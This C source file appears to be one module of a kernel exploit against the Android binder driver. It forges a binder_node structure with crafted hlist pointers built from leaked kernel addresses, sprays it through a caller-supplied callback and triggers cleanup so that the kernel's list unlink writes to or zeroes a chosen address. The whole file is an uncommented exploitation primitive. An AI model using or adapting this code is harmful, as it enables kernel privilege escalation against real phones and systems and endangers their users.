#define _GNU_SOURCE
#include <errno.h>
#include <stddef.h>
#include <stdint.h>
#include <string.h>

typedef int (*list_unlink_write_spray_fn)(void *opaque, const void *payload,
                                          size_t payload_len);
typedef int (*list_unlink_write_trigger_fn)(void *opaque);

typedef struct {
    uint64_t next;
    uint64_t prev;
} list_unlink_head_t;

typedef struct {
    list_unlink_head_t entry;
    uint32_t type;
    uint32_t pad;
} binder_example_work_t;

typedef struct {
    uint64_t next;
    uint64_t pprev;
} list_unlink_hnode_t;

typedef struct {
    uint64_t first;
} list_unlink_hhead_t;

typedef struct {
    uint32_t debug_id;
    uint32_t lock;
    binder_example_work_t work;
    list_unlink_hnode_t dead_node;
    uint64_t proc;
    list_unlink_hhead_t refs;
    int32_t internal_strong_refs;
    int32_t local_weak_refs;
    int32_t local_strong_refs;
    int32_t tmp_refs;
    uint64_t ptr;
    uint64_t cookie;
} list_unlink_binder_example_t;

typedef struct {
    void *opaque;
    list_unlink_write_spray_fn spray_payload;
    list_unlink_write_trigger_fn trigger_cleanup;
    uint64_t marker_ptr;
    uint64_t marker_cookie;
    uint8_t payload[256];
    size_t payload_len;
} list_unlink_write_ctx_t;

int init_list_unlink_write(list_unlink_write_ctx_t *ctx, void *opaque,
                           list_unlink_write_spray_fn spray_payload,
                           list_unlink_write_trigger_fn trigger_cleanup) {
    if (!ctx || !spray_payload || !trigger_cleanup) {
        return -EINVAL;
    }

    memset(ctx, 0, sizeof(*ctx));
    ctx->opaque = opaque;
    ctx->spray_payload = spray_payload;
    ctx->trigger_cleanup = trigger_cleanup;
    ctx->marker_ptr = 0x123456789ULL;
    ctx->marker_cookie = 0x987654321ULL;
    return 0;
}

int execute_list_unlink_write_hlist(list_unlink_write_ctx_t *ctx,
                                    const void *payload, size_t payload_len) {
    if (!ctx || !payload || !payload_len) {
        return -EINVAL;
    }
    if (payload_len > sizeof(ctx->payload)) {
        return -EINVAL;
    }

    memcpy(ctx->payload, payload, payload_len);
    ctx->payload_len = payload_len;

    if (ctx->spray_payload(ctx->opaque, ctx->payload, payload_len) < 0) {
        return -EIO;
    }
    if (ctx->trigger_cleanup(ctx->opaque) < 0) {
        return -EIO;
    }

    return 0;
}

int execute_list_unlink_write_list(list_unlink_write_ctx_t *ctx,
                                   const void *payload, size_t payload_len) {
    return execute_list_unlink_write_hlist(ctx, payload, payload_len);
}

int execute_list_unlink_zero(list_unlink_write_ctx_t *ctx, const void *payload,
                             size_t payload_len) {
    return execute_list_unlink_write_hlist(ctx, payload, payload_len);
}

void build_binder_node_unlink_example(list_unlink_binder_example_t *example,
                                      uint64_t leaked_node_addr,
                                      uint64_t prev_addr,
                                      uint64_t next_addr,
                                      uint64_t marker_ptr,
                                      uint64_t marker_cookie) {
    if (!example) {
        return;
    }

    memset(example, 0, sizeof(*example));
    example->local_strong_refs = 1;
    example->work.entry.next =
        leaked_node_addr + offsetof(list_unlink_binder_example_t, work);
    example->dead_node.next = next_addr;
    example->dead_node.pprev = prev_addr;
    example->refs.first = 0;
    example->proc = 0;
    example->ptr = marker_ptr;
    example->cookie = marker_cookie;
}

int execute_binder_node_unlink_example(list_unlink_write_ctx_t *ctx,
                                       uint64_t leaked_node_addr,
                                       uint64_t prev_addr,
                                       uint64_t next_addr) {
    list_unlink_binder_example_t example;

    if (!ctx || !leaked_node_addr || !prev_addr) {
        return -EINVAL;
    }

    build_binder_node_unlink_example(&example, leaked_node_addr, prev_addr,
                                     next_addr, ctx->marker_ptr,
                                     ctx->marker_cookie);
    return execute_list_unlink_write_hlist(ctx, &example, sizeof(example));
}

int execute_binder_node_zero_example(list_unlink_write_ctx_t *ctx,
                                     uint64_t leaked_node_addr,
                                     uint64_t address) {
    return execute_binder_node_unlink_example(ctx, leaked_node_addr, address, 0);
}

void cleanup_list_unlink_write(list_unlink_write_ctx_t *ctx) {
    if (!ctx) {
        return;
    }

    memset(ctx, 0, sizeof(*ctx));
}
